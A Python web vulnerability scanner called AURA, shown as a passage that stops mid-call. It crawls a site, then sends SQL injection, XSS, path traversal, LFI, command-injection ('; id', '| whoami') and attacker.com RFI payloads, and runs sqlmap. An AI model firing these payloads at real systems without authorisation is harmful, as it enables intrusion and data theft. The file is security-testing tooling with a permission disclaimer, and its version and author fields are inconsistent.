#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AURA - Automated Unified Risk Assessment (complete)
Author  : Abhirup Sarkar
Version : 1.0.0
License : MIT (see LICENSE file)

DISCLAIMER:
    Use this tool ONLY on systems you own or where you have explicit,
    written permission to perform security testing. Unauthorized scanning
    and exploitation is illegal and unethical.
"""

from __future__ import annotations

import argparse
import html
import json
import os
import re
import subprocess
import sys
import time
import warnings
from collections import deque
from datetime import datetime
from typing import Dict, Optional, List, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

import requests
import urllib3
from bs4 import BeautifulSoup
from colorama import init as colorama_init, Fore, Style

# -------------------------
# Init & metadata
# -------------------------
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")
colorama_init(autoreset=True)

VERSION = "2.0.0"
AUTHOR = "REPLACE_WITH_YOUR_NAME"
TOOL_NAME = "AURA - Automated Unified Risk Assessment"
REPORTS_DIR = "reports"
SQLMAP_LOG_DIR = os.path.join(REPORTS_DIR, "sqlmap_logs")

DEFAULT_UA = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/120 Safari/537.36"
)


def ascii_banner(version: str = VERSION, author: str = AUTHOR, tool_name: str = TOOL_NAME) -> None:
    print(
        f"""{Fore.CYAN}
<!-- __| |_________________________________| |__ -->
<!-- __   _________________________________   __ -->
<!--   | |                                 | |   -->
<!--   | | █████╗ ██╗   ██╗██████╗  █████╗ | |   -->
<!--   | |██╔══██╗██║   ██║██╔══██╗██╔══██╗| |   -->
<!--   | |███████║██║   ██║██████╔╝███████║| |   -->
<!--   | |██╔══██║██║   ██║██╔══██╗██╔══██║| |   -->
<!--   | |██║  ██║╚██████╔╝██║  ██║██║  ██║| |   -->
<!--   | |╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝| |   -->
<!-- __| |_________________________________| |__ -->
<!-- __   _________________________________   __ -->
<!--   | |                                 | |   -->

{Style.BRIGHT}{tool_name}{Style.RESET_ALL}
Version : 1.0.0
Author  : Abhirup Sarkar
{Style.RESET_ALL}"""
    )


def ensure_reports_dirs() -> None:
    os.makedirs(REPORTS_DIR, exist_ok=True)
    os.makedirs(SQLMAP_LOG_DIR, exist_ok=True)


def sanitize_filename(s: str) -> str:
    return re.sub(r"[^A-Za-z0-9_.-]", "_", s)


def first_value_from_parse_qs(qs_dict: Dict[str, Any]) -> Dict[str, str]:
    out: Dict[str, str] = {}
    for k, v in qs_dict.items():
        if isinstance(v, (list, tuple)):
            out[k] = v[0] if v else ""
        else:
            out[k] = str(v)
    return out


def parse_params_from_url(url: str) -> Dict[str, str]:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    return first_value_from_parse_qs(qs)


# -------------------------
# Main scanner class
# -------------------------
class AURA:
    def __init__(
        self,
        target_url: str,
        threads: int = 8,
        delay: float = 1.0,
        depth: int = 3,
        timeout: int = 10,
        allow_destructive: bool = False,
        dry_run: bool = False,
        sqlmap_args: Optional[List[str]] = None,
    ):
        self.target_url = target_url.rstrip("/")
        parsed = urlparse(self.target_url)
        if not parsed.scheme:
            raise ValueError("Target URL must include a scheme (http:// or https://)")
        self.base_domain = parsed.netloc
        self.threads = max(1, int(threads))
        self.delay = max(0.0, float(delay))
        self.crawl_depth = max(1, int(depth))
        self.timeout = max(1, int(timeout))
        self.allow_destructive = bool(allow_destructive)
        self.dry_run = bool(dry_run)
        self.sqlmap_args = sqlmap_args or []

        self.session = requests.Session()
        self.session.headers.update(
            {
                "User-Agent": DEFAULT_UA,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
            }
        )

        # state
        self.crawled_urls: set[str] = set()
        self.forms: List[Dict[str, Any]] = []
        self.vulnerabilities: List[Dict[str, Any]] = []
        self.technologies: set[str] = set()
        self.start_time: Optional[datetime] = None
        self.end_time: Optional[datetime] = None

        # payload lists (restored/expanded from original script)
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "admin'/*",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "' AND 1=2 UNION SELECT NULL--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "' OR SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' UNION SELECT user(),version(),database() --",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' OR (SELECT SUBSTRING(@@version,1,1))='5'--",
            "1 OR SLEEP(5)",
            "1; WAITFOR DELAY '0:0:5'--",
            "1 UNION SELECT NULL,NULL,NULL--",
            "1 AND 1=DBMS_LOCK.SLEEP(5)--",
        ]

        self.xss_payloads_reflected = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "'\"><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=\"javascript:alert('XSS')\">",
            "<svg/onload=alert('XSS')>",
            "<script>alert(document.cookie)</script>",
            "<script>alert(location)</script>",
        ]

        self.directory_traversal_payloads = [
            "../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "../../../etc/passwd%00",
        ]

        self.lfi_payloads = [
            "index.php?page=../../../../etc/passwd",
            "index.php?file=../../../../etc/passwd",
            "index.php?include=../../../../etc/passwd",
            "index.php?page=../../../../etc/passwd%00",
            "index.php?page=../../../../etc/passwd%2500",
        ]

        self.rfi_payloads = [
            "http://example.com/shell.php?page=http://attacker.com/malicious.php",
            "http://example.com/shell.php?include=http://attacker.com/malicious.php",
            "http://example.com/shell.php?file=http://attacker.com/malicious.php",
        ]

        self.command_injection_payloads = [
            "; ls -la",
            "&& dir",
            "| whoami",
            "; id",
            "&& whoami",
        ]

        self.exploit_patterns = {
            "wordpress": [
                {
                    "name": "WordPress SQL Injection (example)",
                    "payload": "admin' OR '1'='1' --",
                    "path": "/wp-admin/",
                    "severity": "HIGH",
                },
                {
                    "name": "WordPress XSS (example)",
                    "payload": "<script>alert('WP-XSS')</script>",
                    "path": "/?s=",
                    "severity": "MEDIUM",
                },
            ]
        }

    # ======================
    # low-level request wrapper
    # ======================
    def make_request(
        self,
        url: str,
        method: str = "GET",
        params: Optional[dict] = None,
        data: Optional[dict] = None,
        files: Optional[dict] = None,
        headers: Optional[dict] = None,
        timeout: Optional[int] = None,
    ) -> Optional[requests.Response]:
        timeout = timeout or self.timeout
        req_headers = self.session.headers.copy()
        if headers:
            req_headers.update(headers)
        try:
            if self.dry_run:
                print(f"{Fore.YELLOW}[DRY] {method.upper()} {url} params={params} data={data}{Style.RESET_ALL}")
                return None
            start = time.time()
            if method.upper() == "POST":
                resp = self.session.post(
                    url, params=params, data=data, files=files, headers=req_headers, timeout=timeout, verify=False
                )
            else:
                resp = self.session.get(url, params=params, headers=req_headers, timeout=timeout, verify=False)
            # attach elapsed measured client-side (fallback)
            resp._client_elapsed = time.time() - start  # type: ignore[attr-defined]
            return resp
        except requests.RequestException as ex:
            print(f"{Fore.YELLOW}[WARN] Request failed: {ex}{Style.RESET_ALL}")
            return None

    # ======================
    # crawling & forms
    # ======================
    def extract_forms(self, soup: BeautifulSoup, url: str) -> List[Dict[str, Any]]:
        forms: List[Dict[str, Any]] = []
        for form in soup.find_all("form"):
            action = form.get("action") or url
            method = (form.get("method") or "GET").upper()
            inputs = []
            for tag in form.find_all(["input", "textarea", "select"]):
                name = tag.get("name")
                if not name:
                    continue
                typ = tag.get("type", "text")
                value = tag.get("value", "") or ""
                if tag.name == "textarea" and not value:
                    value = tag.string or ""
                inputs.append({"type": typ, "name": name, "value": value})
            forms.append({"action": urljoin(url, action), "method": method, "inputs": inputs})
        return forms

    def crawl_website(self, max_depth: Optional[int] = None) -> None:
        if max_depth is None:
            max_depth = self.crawl_depth
        print(f"{Fore.BLUE}[INFO] Crawling depth {max_depth}{Style.RESET_ALL}")
        queue = deque()
        queue.append((self.target_url, 0))
        seen: set[str] = set([self.target_url])

        while queue:
            url, depth = queue.popleft()
            if depth >= max_depth:
                continue
            if url in self.crawled_urls:
                continue

            print(f"{Fore.BLUE}[INFO] Crawling ({depth+1}/{max_depth}): {url}{Style.RESET_ALL}")
            resp = self.make_request(url)
            if resp is None:
                continue
            self.crawled_urls.add(url)
            self.detect_technologies(resp)
            try:
                soup = BeautifulSoup(resp.content, "html.parser")
                forms = self.extract_forms(soup, url)
                for f in forms:
                    if f not in self.forms:
                        self.forms.append(f)
                for a in soup.find_all("a", href=True):
                    href = a["href"]
                    full_url = urljoin(url, href)
                    parsed = urlparse(full_url)
                    if parsed.netloc != self.base_domain:
                        continue
                    normalized = parsed.scheme + "://" + parsed.netloc + parsed.path.rstrip("/")
                    if parsed.query:
                        normalized = normalized + "?" + parsed.query
                    if normalized not in seen:
                        seen.add(normalized)
                        queue.append((normalized, depth + 1))
            except Exception as ex:
                print(f"{Fore.YELLOW}[WARN] Error parsing {url}: {ex}{Style.RESET_ALL}")
            time.sleep(self.delay)

    # ======================
    # detection helpers
    # ======================
    def detect_technologies(self, response: requests.Response) -> None:
        if not response:
            return
        headers = response.headers or {}
        if "X-Powered-By" in headers:
            self.technologies.add(headers.get("X-Powered-By", "").lower())
        if "Server" in headers:
            self.technologies.add(headers.get("Server", "").lower())
        content = (response.text or "").lower()
        if "wp-content" in content or "wordpress" in content:
            self.technologies.add("wordpress")
        if "<?php" in content:
            self.technologies.add("php")

    def detect_sql_error(self, response_text: str) -> bool:
        if not response_text:
            return False
        patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"Npgsql\.",
            r"Driver.* SQL[\-\_ ]*Server",
            r"ORA-[0-9]{5}",
            r"SQLite\.Exception",
            r"you have an error in your sql syntax",
            r"unclosed quotation mark after the character string",
            r"mysql_fetch_array\(",
            r"supplied argument is not a valid.*resource",
            r"ODBC SQL Server Driver",
        ]
        for p in patterns:
            if re.search(p, response_text, re.IGNORECASE):
                return True
        return False

    def detect_file_inclusion(self, response_text: str) -> bool:
        if not response_text:
            return False
        indicators = [
            "root:", "root:x:", "/etc/passwd",
            "windows ip configuration",
            "volume in drive", "# this file controls the state of selinux",
            "uid=", "gid=", "bin/bash", "daemon:",
        ]
        lower = response_text.lower()
        return any(ind.lower() in lower for ind in indicators)

    # Helper to check XSS reflection with unescape/encoded checks
    def resp_contains_xss(self, resp_text: str, payload: str) -> bool:
        if not resp_text:
            return False
        # direct
        if payload in resp_text:
            return True
        # unescaped
        try:
            un = html.unescape(resp_text)
            if payload in un:
                return True
        except Exception:
            pass
        # simple encoded variants
        encs = [
            payload.replace("<", "&lt;").replace(">", "&gt;"),
            payload.replace("'", "&#39;").replace('"', "&quot;"),
        ]
        for e in encs:
            if e in resp_text:
                return True
        return False

    # ======================
    # lightweight tests
    # ======================
    def test_sql_injection(self, url: str, params: Optional[dict] = None) -> None:
        print(f"{Fore.BLUE}[INFO] Testing SQL injection on: {url}{Style.RESET_ALL}")
        simple_params = params or parse_params_from_url(url) or {}
        for payload in self.sql_payloads:
            if simple_params:
                for param in list(simple_params.keys()):
                    test_params = simple_params.copy()
                    test_params[param] = payload
                    if self.dry_run:
                        print(f"{Fore.YELLOW}[DRY] GET {url} params={test_params}{Style.RESET_ALL}")
                    else:
                        t0 = time.time()
                        resp = self.make_request(url, params=test_params)
                        if resp:
                            elapsed = getattr(resp, "_client_elapsed", resp.elapsed.total_seconds())
                            text = resp.text or ""
                            # time-based detection (if payload contains sleep/waitfor)
                            if re.search(r"(sleep|waitfor)", payload, re.IGNORECASE):
                                if elapsed and elapsed > 4.0:
                                    self.log_vulnerability("SQL_INJECTION_TIME", url, payload, parameter=param)
                            # error-based detection
                            if self.detect_sql_error(text):
                                self.log_vulnerability("SQL_INJECTION_ERROR", url, payload, parameter=param)
                            # boolean detection: look for common changes - not perfect but helpful
                            # (skipping complex comparative checks to keep safe/simple)
            else:
                test_params = {"id": payload}
                if self.dry_run:
                    print(f"{Fore.YELLOW}[DRY] GET {url} params={test_params}{Style.RESET_ALL}")
                else:
                    resp = self.make_request(url, params=test_params)
                    if resp:
                        elapsed = getattr(resp, "_client_elapsed", resp.elapsed.total_seconds())
                        text = resp.text or ""
                        if re.search(r"(sleep|waitfor)", payload, re.IGNORECASE):
                            if elapsed and elapsed > 4.0:
                                self.log_vulnerability("SQL_INJECTION_TIME", url + "?" + urlencode(test_params), payload)
                        if self.detect_sql_error(text):
                            self.log_vulnerability("SQL_INJECTION_ERROR", url + "?" + urlencode(test_params), payload)
            time.sleep(self.delay)

    def test_xss_reflected(self, url: str, params: Optional[dict] = None) -> None:
        print(f"{Fore.BLUE}[INFO] Testing reflected XSS on: {url}{Style.RESET_ALL}")
        simple_params = params or parse_params_from_url(url) or {}
        for payload in self.xss_payloads_reflected:
            if simple_params:
                for param in list(simple_params.keys()):
                    test_params = simple_params.copy()
                    test_params[param] = payload
                    if self.dry_run:
                        print(f"{Fore.YELLOW}[DRY] GET {url} params={test_params}{Style.RESET_ALL}")
                    else:
                        resp = self.make_request(url, params=test_params)
                        if resp:
                            text = resp.text or ""
                            if self.resp_contains_xss(text, payload):
                                self.log_vulnerability("XSS_REFLECTED", url, payload, parameter=param)
            else:
                test_params = {"q": payload}
                if self.dry_run:
                    print(f"{Fore.YELLOW}[DRY] GET {url} params={test_params}{Style.RESET_ALL}")
                else:
                    resp = self.make_request(url, params=test_params)
                    if resp:
                        text = resp.text or ""
                        if self.resp_contains_xss(text, payload):
                            self.log_vulnerability("XSS_REFLECTED", url + "?" + urlencode(test_params), payload)
            time.sleep(self.delay)

    def test_directory_traversal(self, url: str, params: Optional[dict] = None) -> None:
        print(f"{Fore.BLUE}[INFO] Testing directory traversal on: {url}{Style.RESET_ALL}")
        simple_params = params or parse_params_from_url(url) or {}
        for payload in self.directory_traversal_payloads:
            if simple_params:
                for param in list(simple_params.keys()):
                    test_params = simple_params.copy()
                    test_params[param] = payload
                    if self.dry_run:
                        print(f"{Fore.YELLOW}[DRY] GET {url} params={test_params}{Style.RESET_ALL}")
                    else:
                        resp = self.make_request(url, params=test_params)
                        if resp and self.detect_file_inclusion(resp.text):
                            self.log_vulnerability("DIRECTORY_TRAVERSAL", url, payload, parameter=param)
            else:
                test_params = {"file": payload}
                if self.dry_run:
                    print(f"{Fore.YELLOW}[DRY] GET {url} params={test_params}{Style.RESET_ALL}")
                else:
                    resp = self.make_request(url, params=test_params)
                    if resp and self.detect_file_inclusion(resp.text):
                        self.log_vulnerability("DIRECTORY_TRAVERSAL", url + "?" + urlencode(test_params), payload)
            time.sleep(self.delay)

    def test_command_injection(self, url: str, params: Optional[dict] = None) -> None:
        print(f"{Fore.BLUE}[INFO] Testing command injection on: {url}{Style.RESET_ALL}")
        simple_params = params or parse_params_from_url(url) or {}
        for payload in self.command_injection_payloads:
            if simple_params:
                for param in list(simple_params.keys()):
                    test_params = simple_params.copy()
                    test_params[param] = payload
                    if self.dry_run:
                        print(f"{Fore.YELLOW}[DRY] GET {url} params={test_params}{Style.RESET_ALL}")
                    else:
                        resp = self.make_request(url, params=test_params)
                        if resp:
                            text = resp.text or ""
                            if any(sig in text.lower() for sig in ("command not found", "permission denied", "uid=")):
                                self.log_vulnerability("COMMAND_INJECTION", url, payload, parameter=param)
            else:
                test_params = {"cmd": payload}
                if self.dry_run:
                    print(f"{Fore.YELLOW}[DRY] GET {url} params={test_params}{Style.RESET_ALL}")
                else:
                    resp = self.make_request(url, params=test_params)
                    if resp:
                        text = resp.text or ""
                        if any(sig in text.lower() for sig in ("command not found", "permission denied", "uid=")):
                            self.log_vulnerability("COMMAND_INJECTION", url + "?" + urlencode(test_params), payload)
            time.sleep(self.delay)

    def test_lfi(self, url: str, params: Optional[dict] = None) -> None:
        print(f"{Fore.BLUE}[INFO] Testing local file inclusion on: {url}{Style.RESET_ALL}")
        simple_params = params or parse_params_from_url(url) or {}
        for payload in self.lfi_payloads:
            if simple_params:
                for param in list(simple_params.keys()):
                    test_params = simple_params.copy()
                    test_params[param] = payload
                    if self.dry_run:
                        print(f"{Fore.YELLOW}[DRY] GET {url} params={test_params}{Style.RESET_ALL}")
                    else:
                        resp = self.make_request(url, params=test_params)
                        if resp and self.detect_file_inclusion(resp.text):
                            self.log_vulnerability("LFI", url, payload, parameter=param)
            else:
                test_params = {"file": payload}
                if self.dry_run:
                    print(f"{Fore.YELLOW}[DRY] GET {url} params={test_params}{Style.RESET_ALL}")
                else:
                    resp = self.make_request(url, params=test_params)
                    if resp and self.detect_file_inclusion(resp.text):
                        self.log_vulnerability("LFI", url + "?" + urlencode(test_params), payload)
            time.sleep(self.delay)

    def test_rfi(self, url: str, params: Optional[dict] = None) -> None:
        print(f"{Fore.BLUE}[INFO] Testing remote file inclusion on: {url}{Style.RESET_ALL}")
        simple_params = params or parse_params_from_url(url) or {}
        for payload in self.rfi_payloads:
            if simple_params:
                for param in list(simple_params.keys()):
                    test_params = simple_params.copy()
                    test_params[param] = payload
                    if self.dry_run:
                        print(f"{Fore.YELLOW}[DRY] GET {url} params={test_params}{Style.RESET_ALL}")
                    else:
                        resp = self.make_request(url, params=test_params)
                        if resp and "malicious.php" in resp.text:
                            self.log_vulnerability("RFI", url, payload, parameter=param)
            else:
                test_params = {"file": payload}
                if self.dry_run:
                    print(f"{Fore.YELLOW}[DRY] GET {url} params={test_params}{Style.RESET_ALL}")
                else:
                    resp = self.make_request(url, params=test_params)
                    if resp and "malicious.php" in resp.text:
                        self.log_vulnerability("RFI", url + "?" + urlencode(test_params), payload)
            time.sleep(self.delay)

    # forms
    def test_forms_basic(self) -> None:
        print(f"{Fore.BLUE}[INFO] Testing forms for basic SQLi/XSS{Style.RESET_ALL}")
        for form in self.forms:
            action = form.get("action")
            method = form.get("method", "GET")
            inputs = form.get("inputs", [])
            data = {i["name"]: i.get("value", "") for i in inputs if i.get("name")}
            if not action:
                continue
            if method.upper() == "POST":
                for payload in (self.sql_payloads + self.xss_payloads_reflected):
                    for param in list(data.keys()):
                        test_data = data.copy()
                        test_data[param] = payload
                        if self.dry_run:
                            print(f"{Fore.YELLOW}[DRY] POST {action} data={test_data}{Style.RESET_ALL}")
                        else:
                            resp = self.make_request(action, method="POST", data=test_data)
                            if resp:
                                text = resp.text or ""
                                if self.detect_sql_error(text) or self.resp_contains_xss(text, payload):
                                    self.log_vulnerability("FORM_VULN", action, payload, parameter=param, method="POST")
            else:
                for payload in self.xss_payloads_reflected:
                    for param in list(data.keys()):
                        test_params = data.copy()
                        test_params[param] = payload
                        if self.dry_run:
                            print(f"{Fore.YELLOW}[DRY] GET {action} params={test_params}{Style.RESET_ALL}")
                        else:
                            resp = self.make_request(action, params=test_params)
                            if resp:
                                text = resp.text or ""
                                if self.resp_contains_xss(text, payload):
                                    self.log_vulnerability("FORM_VULN", action, payload, parameter=param, method="GET")
            time.sleep(self.delay)

    def test_exploit_patterns(self) -> None:
        print(f"{Fore.BLUE}[INFO] Testing known exploit patterns for detected technologies{Style.RESET_ALL}")
        for tech, patterns in self.exploit_patterns.items():
            if tech in self.technologies:
                for pattern in patterns:
                    url = urljoin(self.target_url, pattern.get("path", "/"))
                    payload = pattern.get("payload", "")
                    if self.dry_run:
                        print(f"{Fore.YELLOW}[DRY] GET {url} payload={payload}{Style.RESET_ALL}")
                    else:
                        resp = self.make_request(url, params={"q": payload} if payload else None)
                        if resp:
                            text = resp.text or ""
                            if self.detect_sql_error(text) or (payload and payload in text):
                                self.log_vulnerability(pattern.get("name", "EXPLOIT_PATTERN"), url, payload, severity=pattern.get("severity"))
                    time.sleep(self.delay)

    def check_common_vulnerabilities(self) -> None:
        print(f"{Fore.BLUE}[INFO] Checking common paths and vulnerabilities{Style.RESET_ALL}")
        common_paths = [
            "/admin",
            "/login",
            "/wp-admin",
            "/phpmyadmin",
            "/cgi-bin",
            "/.git",
            "/.svn",
            "/.htaccess",
            "/robots.txt",
            "/sitemap.xml",
        ]
        for path in common_paths:
            url = urljoin(self.target_url, path)
            if self.dry_run:
                print(f"{Fore.YELLOW}[DRY] GET {url}{Style.RESET_ALL}")
            else:
                resp = self.make_request(url)
                if resp and resp.status_code == 200:
                    self.log_vulnerability("COMMON_PATH", url, details=f"Found: {path}")
            time.sleep(self.delay)

    # ======================
    # sqlmap integration
    # ======================
    def run_sqlmap(self) -> None:
        """Run sqlmap against the target and parse results."""
        print(f"{Fore.YELLOW}[INFO] Running sqlmap on {self.target_url}...{Style.RESET_ALL}")
        try:
            report_dir = SQLMAP_LOG_DIR
            os.makedirs(report_dir, exist_ok=True)

            cmd = [
                "sqlmap",
                "-u",
                self.target_url,
                "--batch",
                "--level=3",
                "--risk=2",
                f"--output-dir={report_dir}",
                "--disable-coloring",
            ]
            if self.sqlmap_args:
                cmd.extend(self.sqlmap_args)

            if self.dry_run:
                print(f"{Fore.YELLOW}[DRY] Would run: {' '.join(cmd)}{Style.RESET_ALL}")
                return

            result = subprocess.run(cmd, capture_output=True, text=True, check=False, timeout=300)
            output = (result.stdout or "") + (result.stderr or "")
            lower = output.lower()
            indicators = [
                "appears to be injectable",
                "identified the following injection point",
                "is vulnerable",
                "sqlmap identified",
                "target is vulnerable"
            ]
            if any(ind in lower for ind in indicators):
                self.vulnerabilities.append({
                    "timestamp": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
                    "url": self.target_url,
                    "vulnerability": "SQL Injection",
                    "tool": "sqlmap",
                    "details": "Confirmed by sqlmap",
                    "severity": "HIGH",
                })
                print(f"{Fore.RED}[!] SQL Injection detected at {self.target_url} (sqlmap){Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}[OK] No SQL Injection detected by sqlmap at {self.target_url}{Style.RESET_ALL}")

        except FileNotFoundError:
            print(f"{Fore.RED}[ERROR] sqlmap not installed or not in PATH. Install separately (e.g. sudo apt install sqlmap){Style.RESET_ALL}")
        except subprocess.TimeoutExpired:
            print(f"{Fore.YELLOW}[WARN] sqlmap timed out (long scan).{Style.RESET_ALL}")

    # ======================
    # logging & reporting
    # ======================
    def log_vulnerability(self, vulnerability_type: str, url: str, payload: str = "", parameter: Optional[str] = None, method: Optional[str] = None, severity: Optional[str] = None, details: Optional[str] = None) -> None:
        severity = severity or self.get_severity(vulnerability_type)
        timestamp = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
        vuln = {
            "timestamp": timestamp,
            "url": url,
            "vulnerability": vulnerability_type,
            "payload": payload,
            "parameter": parameter,
            "method": method,
            "severity": severity,
            "details": details,
        }
        # dedupe: check if same (url, vulnerability, parameter, payload) already exists
        key = (url, vulnerability_type, parameter or "", payload or "")
        for existing in self.vulnerabilities:
            if (existing.get("url"), existing.get("vulnerability"), existing.get("parameter") or "", existing.get("payload") or "") == key:
                return
        self.vulnerabilities.append(vuln)
        print(f"{Fore.RED}[!] {vulnerability_type} detected at {url} (param={parameter}){Style.RESET_ALL}")

    def get_severity(self, vulnerability_type: str) -> str:
        severities = {
            "SQL_INJECTION": "HIGH",
            "SQL_INJECTION_ERROR": "HIGH",
            "SQL_INJECTION_TIME": "HIGH",
            "XSS_REFLECTED": "MEDIUM",
            "XSS_DOM": "MEDIUM",
            "XSS_STORED": "HIGH",
            "DIRECTORY_TRAVERSAL": "HIGH",
            "COMMAND_INJECTION": "HIGH",
            "LFI": "HIGH",
            "RFI": "HIGH",
            "FORM_VULN": "MEDIUM",
            "COMMON_PATH": "INFO",
        }
        return severities.get(vulnerability_type, "INFO")

    def generate_report(self, filename: Optional[str] = None) -> str:
        ensure_reports_dirs()
        if not filename:
            filename = f"aura_report_{sanitize_filename(self.base_domain)}_{datetime.utcnow().strftime('%Y%m%d%H%M%S')}.json"
        report_path = os.path.join(REPORTS_DIR, filename)
        duration = None
        if self.start_time and self.end_time:
            duration = (self.end_time - self.start_time).total_seconds()
        report = {
            "target": self.target_url,
            "start_time": self.start_time.isoformat() if self.start_time else None,
            "end_time": self.end_time.isoformat() if self.end_time else None,
            "duration_seconds": duration,
            "technologies": sorted(list(self.technologies)),
            "vulnerabilities": self.vulnerabilities,
        }
        with open(report_path, "w") as f:
            json.dump(report, f, indent=4, sort_keys=True)
        print(f"{Fore.GREEN}[OK] Report saved to {report_path}{Style.RESET_ALL}")
        return report_path

    # ======================
    # orchestration
    # ======================
    def run_full_scan(self) -> None:
        self.start_time = datetime.utcnow()
        print(f"{Fore.BLUE}[INFO] Starting full scan on {self.target_url}{Style.RESET_ALL}")
        try:
            self.crawl_website()
            all_urls = set(self.crawled_urls) | {self.target_url}
            for url in all_urls:
                self.test_sql_injection(url)
                self.test_xss_reflected(url)
                self.test_directory_traversal(url)
                self.test_command_injection(url)
                self.test_lfi(url)
                self.test_rfi(url)
                time.sleep(self.delay)
            self.run_sqlmap()
            self.test_forms_basic()
            self.test_exploit_patterns()
            self.check_common_vulnerabilities()
        finally:
            self.end_time = datetime.utcnow()
            print(f"{Fore.BLUE}[INFO] Full scan completed ({len(self.vulnerabilities)} findings){Style.RESET_ALL}")

    # interactive menu
    def interactive_menu(self) -> None:
        try:
            while True:
                print("\nChoose an action:")
                print(" 1) Crawl website (collect URLs & forms)")
                print(" 2) Lightweight SQLi tests (payload list)")
                print(" 3) Run sqlmap on target (external tool)")
                print(" 4) Run XSS tests (reflected)")
                print(" 5) Attempt stored XSS (requires --allow-destructive)")
                print(" 6) Test forms (limited SQLi/XSS)")
                print(" 7) Check common paths & exploit patterns")
                print(" 8) Run full automated scan (all non-destructive + sqlmap where applicable)")
                print(" 9) Save current findings to report")
                print("10) View latest report")
                print(" 0) Exit")
                choice = input("Enter choice: ").strip()
                if choice == "1":
                    self.crawl_website()
                elif choice == "2":
                    self.test_sql_injection(self.target_url)
                elif choice == "3":
                    self.run_sqlmap()
                elif choice == "4":
                    self.test_xss_reflected(self.target_url)
                elif choice == "5":
                    if not self.allow_destructive:
                        print(f"{Fore.YELLOW}[WARN] Stored XSS testing is destructive. Rerun with --allow-destructive{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.YELLOW}[WARN] Running destructive tests - ensure you have permission!{Style.RESET_ALL}")
                        self.test_forms_basic()
                elif choice == "6":
                    self.test_forms_basic()
                elif choice == "7":
                    self.test_exploit_patterns()
                    self.check_common_vulnerabilities()
                elif choice == "8":
                    self.run_full_scan()
                    report_path = self.generate_report()
                    if self.vulnerabilities:
                        print(f"{Fore.RED}[SUMMARY] Vulnerabilities found: {len(self.vulnerabilities)}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.GREEN}[SUMMARY] No vulnerabilities found.{Style.RESET_ALL}")
                    print(f"[REPORT] {report_path}")
                elif choice == "9":
                    path = self.generate_report()
                    print(f"[INFO] Report written: {path}")
                elif choice == "10":
                    if not os.path.isdir(REPORTS_DIR):
                        print(f"{Fore.YELLOW}[WARN] No reports found{Style.RESET_ALL}")
                        continue
                    report_files = [f for f in os.listdir(REPORTS_DIR) if f.endswith(".json")]
                    if report_files:
                        latest_report = max(report_files, key=lambda f: os.path.getctime(os.path.join(REPORTS_DIR, f)))
                        with open(os.path.join(REPORTS_DIR, latest_report), "r") as f:
                            report_data = json.load(f)
                            print(json.dumps(report_data, indent=4, sort_keys=True))
                    else:
                        print(f"{Fore.YELLOW}[WARN] No reports found{Style.RESET_ALL}")
                elif choice == "0":
                    break
                else:
                    print(f"{Fore.YELLOW}[WARN] Invalid choice{Style.RESET_ALL}")
        except KeyboardInterrupt:
            print("\nExiting interactive menu.")


# ======================
# CLI parsing with banner-on-help
# ======================
class BannerHelpAction(argparse.Action):
    """Custom action to print banner then help (used for -h/--help)."""

    def __init__(self, option_strings, dest=argparse.SUPPRESS, default=argparse.SUPPRESS, help=None):
        super().__init__(option_strings=option_strings, dest=dest, nargs=0, help=help)

    def __call__(self, parser, namespace, values, option_string=None):
        ascii_banner()
        parser.print_help()
        parser.exit()


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=TOOL_NAME, add_help=False)
    parser.add_argument("-h", "--help", action=BannerHelpAction, help="Show this help message and exit.")
    parser.add_argument("-u", "--url", required=True, help="Target URL to scan (include scheme, e.g. https://example.com)")
    parser.add_argument("--threads", type=int, default=8, help="Number of threads (unused in this simple version)")
    parser.add_argument("--delay", type=float, default=1.0, help="Delay between requests in seconds (default: 1.0)")
    parser.add_argument("--depth", type=int, default=2, help="Depth to crawl the website (default: 2)")
    parser.add_argument("--timeout", type=int, default=10, help="Timeout for each request in seconds (default: 10)")
    parser.add_argument("--allow-destructive", action="store_true", help="Allow destructive tests (stored XSS, etc.)")
    parser.add_argument("--dry-run", action="store_true", help="Dry run (don't make network requests)")
    parser.add_argument("--sqlmap-args", nargs="*", help="Additional arguments to pass to sqlmap (space-separated)")
    parser.add_argument("--run-full", action="store_true", help="Run a full automated scan without interactive prompts")
    parser.add_argument("--version", action="store_true", help="Show version and exit")
    return parser.parse_args()


def main() -> None:
    args = parse_args()

    if getattr(args, "version", False):
        ascii_banner()
        print(f"Version: {VERSION}")
        sys.exit(0)

    ensure_reports_dirs()
    ascii_banner()

    try:
        scanner = AURA(
            target_url=args.url,
            threads=args.threads,
            delay=args.delay,
            depth=args.depth,
            timeout=args.timeout,
            allow_destructive=args.allow_destructive,
            dry_run=args.dry_run,
